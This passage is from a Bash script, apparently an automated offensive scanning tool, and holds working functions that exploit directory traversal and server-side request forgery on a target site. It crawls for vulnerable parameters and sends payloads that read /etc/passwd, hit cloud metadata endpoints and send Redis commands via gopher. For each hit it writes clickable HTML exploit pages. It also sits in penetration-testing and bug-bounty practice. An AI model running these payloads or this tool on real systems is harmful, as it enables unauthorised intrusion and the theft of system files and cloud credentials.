                if [[ "$url" =~ (file|path|include|doc|pdf|load|read|download|dir|folder|page|template|config)= ]]; then
                    potential_urls+=("$url")
                    # Extract parameter name
                    local param=$(echo "$url" | grep -oP '(?<=[?&])(file|path|include|doc|pdf|load|read|download|dir|folder|page|template|config)=' | head -1 | tr -d '=')
                    [[ -n "$param" ]] && file_params+=("$param")
                fi
            done < "$source"
        fi
    done
    
    # If we couldn't find any from our existing sources, try checking the main website
    if [[ ${#potential_urls[@]} -eq 0 ]]; then
        log_message "No potential URLs found in scan results. Checking main website." "INFO"
        
        local main_url="http://${target}"
        local response=$(curl -s -L "$main_url")
        
        # Extract links with potential file parameters
        local extracted_urls=$(echo "$response" | grep -oP 'href="[^"]*[?&](file|path|include|doc|pdf|load|read|download|dir|folder|page|template|config)=[^"]*"' | sed 's/href="//g' | tr -d '"')
        
        if [[ -n "$extracted_urls" ]]; then
            while read -r url; do
                [[ -z "$url" ]] && continue
                
                # If relative URL, make it absolute
                if [[ ! "$url" =~ ^https?:// ]]; then
                    if [[ "$url" == /* ]]; then
                        url="http://${target}${url}"
                    else
                        url="http://${target}/${url}"
                    fi
                fi
                
                potential_urls+=("$url")
                local param=$(echo "$url" | grep -oP '(?<=[?&])(file|path|include|doc|pdf|load|read|download|dir|folder|page|template|config)=' | head -1 | tr -d '=')
                [[ -n "$param" ]] && file_params+=("$param")
            done <<< "$extracted_urls"
        fi
    fi
    
    # If no URLs found, generate test URLs
    if [[ ${#potential_urls[@]} -eq 0 ]]; then
        log_message "No potential URLs found. Generating some test URLs." "WARNING"
        
        local test_paths=("index.php" "page.php" "file.php" "view.php" "load.php" "include.php" "read.php" "download.php")
        local test_params=("file" "path" "include" "page" "dir" "load" "read" "document")
        
        for path in "${test_paths[@]}"; do
            for param in "${test_params[@]}"; do
                potential_urls+=("http://${target}/${path}?${param}=test.txt")
                file_params+=("$param")
            done
        done
    fi
    
    # Start testing
    log_message "Testing $(wc -l <<< "${potential_urls[@]}") potential URLs for directory traversal" "INFO"
    echo "Directory Traversal Tests for $target" > "$output_file"
    echo "----------------------------------------" >> "$output_file"
    echo "Potential vulnerable URLs:" >> "$output_file"
    printf '%s\n' "${potential_urls[@]}" >> "$output_file"
    echo "" >> "$output_file"
    echo "Testing with $(wc -l < "$payloads_file") different payloads..." >> "$output_file"
    echo "" >> "$output_file"
    echo "Results:" >> "$output_file"
    echo "----------------------------------------" >> "$output_file"
    
    local vulnerable_count=0
    local vulnerable_urls=()
    
    # Try each URL with each payload
    for url in "${potential_urls[@]}"; do
        local param=$(echo "$url" | grep -oP '(?<=[?&])(file|path|include|doc|pdf|load|read|download|dir|folder|page|template|config)=' | head -1 | tr -d '=')
        
        if [[ -z "$param" ]]; then
            continue
        fi
        
        log_message "Testing parameter '$param' in URL: $url" "INFO"
        echo "Testing URL: $url" >> "$output_file"
        echo "Parameter: $param" >> "$output_file"
        
        # Extract the base part of the URL
        local url_base=""
        if [[ "$url" =~ (.+[?&])$param=([^&]*)(.*) ]]; then
            url_base="${BASH_REMATCH[1]}${param}="
            url_suffix="${BASH_REMATCH[3]}"
        else
            continue
        fi
        
        local is_vulnerable=false
        
        # Test with each payload
        while read -r payload; do
            [[ -z "$payload" ]] && continue
            
            # URL encode the payload
            local encoded_payload=$(url_encode "$payload")
            local test_url="${url_base}${encoded_payload}${url_suffix}"
            
            log_message "Testing payload: $payload" "DEBUG"
            
            # Make the request
            local response=$(curl -s -L -o /dev/null -w "%{http_code}" "$test_url")
            
            # If not 4xx or 5xx error, check content for signs of successful traversal
            if [[ "$response" != 4* && "$response" != 5* ]]; then
                local content=$(curl -s -L "$test_url")
                
                # Check for common patterns in sensitive files
                if [[ "$content" =~ root:.*:0:0: || 
                      "$content" =~ \[boot\ loader\] || 
                      "$content" =~ \[fonts\] || 
                      "$content" =~ \[extensions\] || 
                      "$content" =~ Windows\ Registry ||
                      "$content" =~ "PID" && "$content" =~ "PPid" ||
                      "$content" =~ "Uid:" && "$content" =~ "Gid:" ]]; then
                    log_message "Potential directory traversal vulnerability found with payload: $payload" "SUCCESS"
                    echo "  [+] VULNERABLE with payload: $payload" >> "$output_file"
                    echo "  [+] HTTP Status: $response" >> "$output_file"
                    echo "  [+] Content indicates successful traversal" >> "$output_file"
                    
                    is_vulnerable=true
                    vulnerable_count=$((vulnerable_count + 1))
                    vulnerable_urls+=("$url")
                    
                    # Generate PoC
                    local poc_file="${poc_dir}/directory_traversal_poc_${vulnerable_count}.html"
                    
                    cat > "$poc_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Directory Traversal Proof of Concept - $target</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        h1 { color: #d9534f; }
        .url { word-break: break-all; background: #f8f9fa; padding: 10px; border-radius: 4px; }
        .warning { color: #d9534f; font-weight: bold; }
        pre { background: #f8f9fa; padding: 15px; border-radius: 4px; overflow: auto; }
        button { background: #d9534f; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #c9302c; }
    </style>
</head>
<body>
    <h1>Directory Traversal Vulnerability Proof of Concept</h1>
    <p>The following demonstrates a directory traversal vulnerability in <strong>$target</strong>.</p>
    <p class="warning">Warning: Clicking the button below will trigger the exploit payload.</p>
    
    <div class="url">
        <p><strong>Vulnerable URL:</strong> $url</p>
        <p><strong>Vulnerable Parameter:</strong> $param</p>
        <p><strong>Payload:</strong> $payload</p>
    </div>
    
    <p>Click the button below to test the exploit (this will open a new tab):</p>
    <button onclick="window.open('$test_url', '_blank')">Test Directory Traversal</button>
    
    <hr>
    <p><em>This is a proof of concept generated by MR Legacy Bug Bounty Tool. For security research purposes only.</em></p>
</body>
</html>
EOF
                    
                    log_message "Created Directory Traversal PoC file: $poc_file" "SUCCESS"
                    
                    # Only test a few payloads per URL if we already found a vulnerability
                    break
                fi
            fi
        done < "$payloads_file"
        
        if [[ "$is_vulnerable" == "true" ]]; then
            echo "  [!] URL confirmed vulnerable to directory traversal" >> "$output_file"
        else
            echo "  [-] No directory traversal vulnerability detected" >> "$output_file"
        fi
        
        echo "" >> "$output_file"
    done
    
    # Summarize findings
    echo "" >> "$output_file"
    echo "Directory Traversal Exploitation Summary" >> "$output_file"
    echo "----------------------------------------" >> "$output_file"
    echo "URLs tested: ${#potential_urls[@]}" >> "$output_file"
    echo "Payloads tested: $(wc -l < "$payloads_file")" >> "$output_file"
    echo "Vulnerabilities found: $vulnerable_count" >> "$output_file"
    
    if [[ $vulnerable_count -gt 0 ]]; then
        echo "" >> "$output_file"
        echo "Vulnerable URLs:" >> "$output_file"
        printf '%s\n' "${vulnerable_urls[@]}" >> "$output_file"
        
        log_message "Directory traversal exploitation completed. Found $vulnerable_count vulnerabilities." "SUCCESS"
        end_function "exploit_directory_traversal" 0 "Directory traversal exploitation completed successfully"
        return 0
    else
        log_message "No directory traversal vulnerabilities were found" "WARNING"
        end_function "exploit_directory_traversal" 1 "Directory traversal exploitation completed - no vulnerabilities found"
        return 1
    fi
}

function exploit_ssrf() {
    if is_completed "exploit_ssrf"; then
        log_message "SSRF exploitation already completed for $target" "INFO"
        return 0
    fi
    
    start_function "exploit_ssrf" "SSRF Exploitation for $target"
    
    # Create output directories
    mkdir -p "${target_dir}/exploitation/ssrf" 2>/dev/null
    local output_file="${target_dir}/exploitation/ssrf/exploitation_results.txt"
    local payloads_file="${target_dir}/exploitation/ssrf/ssrf_payloads.txt"
    local params_file="${target_dir}/enumeration/parameters/all_parameters.txt"
    
    # Initialize output file
    > "$output_file"
    
    # Use custom SSRF payloads file if it exists, otherwise create a default one
    local custom_wordlist="${script_path}/modules/wordlists/ssrf_payloads.txt"
    
    if [[ -f "$custom_wordlist" ]]; then
        log_message "Using custom SSRF payloads wordlist" "INFO"
        cp "$custom_wordlist" "$payloads_file"
    else
        # Create basic SSRF payloads file as fallback
        log_message "Custom SSRF payloads wordlist not found, creating default one" "WARNING"
        cat > "$payloads_file" << 'EOL'
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://0
http://0177.0.0.1
http://2130706433
http://017700000001
http://0x7f.0x0.0x0.0x1
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:5432
http://127.0.0.1:8080
http://127.0.0.1:80
http://127.0.0.1:443
http://localhost:22
http://localhost:3306
file:///etc/passwd
dict://127.0.0.1:6379/info
ftp://127.0.0.1:21
gopher://127.0.0.1:6379/_KEYS%20*
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/latest/meta-data/
http://cloud-init.internal/latest/
http://127.1:80
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
EOL
    fi
    
    log_message "Created SSRF payload list with $(wc -l < "$payloads_file") payloads" "INFO"
    
    # Check for input parameters to test
    if [[ ! -f "$params_file" || ! -s "$params_file" ]]; then
        # If no params file found, look for URLs with parameters
        log_message "No parameters file found. Looking for URLs with parameters..." "INFO"
        
        # Check content_discovery directory for URLs
        local urls_file="${target_dir}/content_discovery/urls.txt"
        if [[ ! -f "$urls_file" || ! -s "$urls_file" ]]; then
            # If no URLs file, create one from scraping main domain
            urls_file="${target_dir}/.tmp/temp_urls.txt"
            mkdir -p "${target_dir}/.tmp" 2>/dev/null
            
            log_message "Scraping target for URLs..." "INFO"
            curl -s -L "$target" 2>/dev/null | grep -o 'href="[^"]*"' | cut -d '"' -f 2 > "$urls_file"
            
            # Add some common endpoints that might be vulnerable to SSRF
            cat >> "$urls_file" << 'EOL'
/api/fetch
/proxy
/cgi-bin/redirect.cgi
/load
/url
/download
/pdf
/proxy.php
/redir
/redirect
/preview
/view
/api/v1/retrieve
/api/v1/exchange
/api/v1/file
EOL
        fi
        
        # Look for URLs with potential SSRF parameters
        params_file="${target_dir}/.tmp/ssrf_params.txt"
        > "$params_file"
        
        cat > "${target_dir}/.tmp/ssrf_param_names.txt" << 'EOL'
url
uri
path
src
dest
redirect
link
site
target
data
reference
ref
file
document
window
next
feed
host
port
to
out
view
domain
callback
return
page
feed
uri
proxy
EOL
        
        # Extract URLs with parameters
        while read -r url; do
            if [[ "$url" == *"="* ]]; then
                # URL contains parameters
                echo "$url" >> "$params_file"
            elif [[ "$url" != "" && "$url" != "#" && "$url" != "/" ]]; then
                # Add parameters to URL
                while read -r param; do
                    echo "${url}?${param}=https://example.com" >> "$params_file"
                done < "${target_dir}/.tmp/ssrf_param_names.txt"
            fi
        done < "$urls_file"
    fi
    
    # Check if we have parameters to test
    if [[ ! -f "$params_file" || ! -s "$params_file" ]]; then
        log_message "No suitable parameters found for SSRF testing" "WARNING"
        echo "SSRF exploitation skipped - no suitable parameters" > "$output_file"
        end_function "exploit_ssrf" 1 "SSRF exploitation skipped - no suitable parameters"
        return 1
    fi
    
    log_message "Starting SSRF detection and exploitation" "INFO"
    
    # Create a unique identifier for callback detection
    local callback_id=$(date +%s | sha256sum | head -c 8)
    local callback_domain="ssrf-${callback_id}.example.com"
    
    log_message "Testing parameters for SSRF vulnerabilities..." "INFO"
    
    echo "SSRF Detection Results for $target" > "$output_file"
    echo "=================================" >> "$output_file"
    echo "Generated on: $(date)" >> "$output_file"
    echo "" >> "$output_file"
    
    local vuln_count=0
    
    # Test each parameter with payloads
    while read -r url; do
        # Skip if not a URL with parameters
        [[ "$url" != *"="* ]] && continue
        
        # Extract base URL and parameters
        local base_url=$(echo "$url" | cut -d'?' -f1)
        local params=$(echo "$url" | cut -d'?' -f2-)
        
        # Process each parameter
        IFS='&' read -ra param_pairs <<< "$params"
        for pair in "${param_pairs[@]}"; do
            local param_name=$(echo "$pair" | cut -d'=' -f1)
            local param_value=$(echo "$pair" | cut -d'=' -f2)
            
            # Skip non-URL parameters that are unlikely to be SSRF vectors
            if ! echo "$param_name" | grep -qiE '(url|uri|path|link|site|redirect|callback|src|dest)'; then
                continue
            fi
            
            log_message "Testing parameter '$param_name' in $base_url" "INFO"
            
            # Test with SSRF payloads
            while read -r payload; do
                # Encode the payload
                local encoded_payload=$(url_encode "$payload")
                
                # Replace the parameter with our payload
                local test_url="${base_url}?"
                local param_added=0
                
                for p in "${param_pairs[@]}"; do
                    local p_name=$(echo "$p" | cut -d'=' -f1)
                    
                    if [[ "$p_name" == "$param_name" ]]; then
                        test_url="${test_url}${p_name}=${encoded_payload}&"
                        param_added=1
                    else
                        test_url="${test_url}${p}&"
                    fi
                done
                
                # Remove trailing & and fetch the URL
                test_url=${test_url%&}
                
                # Test for SSRF
                log_message "Testing $test_url for SSRF" "DEBUG"
                
                local response_code=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "$test_url" 2>/dev/null)
                
                # Check if the response is successful (2xx or 3xx)
                if [[ $response_code -ge 200 && $response_code -lt 400 ]]; then
                    # Potential SSRF found
                    vuln_count=$((vuln_count + 1))
                    
                    echo "Vulnerable Parameter: $param_name" >> "$output_file"
                    echo "Payload: $payload" >> "$output_file"
                    echo "Test URL: $test_url" >> "$output_file"
                    echo "Response Code: $response_code" >> "$output_file"
                    echo "----------------------------------------" >> "$output_file"
                    
                    log_message "Potential SSRF found with parameter '$param_name' and payload '$payload'" "SUCCESS"
                    
                    # Create a PoC file
                    local poc_file="${target_dir}/exploitation/ssrf/ssrf_poc_${param_name}.html"
                    
                    cat > "$poc_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Proof of Concept - ${target}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        h1 { color: #d9534f; }
        .url { word-break: break-all; background: #f8f9fa; padding: 10px; border-radius: 4px; }
        .warning { color: #d9534f; font-weight: bold; }
        button { background: #d9534f; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #c9302c; }
    </style>
</head>
<body>
    <h1>SSRF Vulnerability Proof of Concept</h1>
    <p>The following demonstrates a Server-Side Request Forgery vulnerability in <strong>${target}</strong>.</p>
    <p class="warning">Warning: Clicking the button below will trigger the SSRF payload.</p>
    
    <div class="url">
        <p><strong>Vulnerable Parameter:</strong> ${param_name}</p>
        <p><strong>Payload:</strong> ${payload}</p>
        <p><strong>Test URL:</strong> ${test_url}</p>
    </div>
    
    <p>Click the button below to test the exploit (this will open a new tab):</p>
    <button onclick="window.open('${test_url}', '_blank')">Test SSRF Vulnerability</button>
    
    <hr>
    <p><em>This is a proof of concept generated by MR Legacy Bug Bounty Tool. For security research purposes only.</em></p>
</body>
</html>
EOF
                    
                    log_message "Created SSRF PoC file: $poc_file" "SUCCESS"
                    
                    # Break the loop once a vulnerability is found for this parameter
                    break
                fi
            done < "$payloads_file" | head -5  # Limit to first 5 payloads for efficiency
        done
    done < "$params_file"
    
    # Summary
    if [[ $vuln_count -gt 0 ]]; then
        log_message "SSRF exploitation completed. Found $vuln_count potential SSRF vulnerabilities." "SUCCESS"
        echo "" >> "$output_file"
        echo "Summary: Found $vuln_count potential SSRF vulnerabilities." >> "$output_file"
        end_function "exploit_ssrf" 0 "SSRF exploitation completed successfully"
        return 0
    else
        log_message "No SSRF vulnerabilities found" "INFO"
        echo "No SSRF vulnerabilities found in tested parameters." >> "$output_file"
        end_function "exploit_ssrf" 0 "SSRF exploitation completed - no vulnerabilities found"
        return 0
    fi
}

# Export functions
export -f exploit_xss
export -f exploit_sqli
export -f exploit_openredirect
export -f exploit_ssrf
export -f run_exploitation_module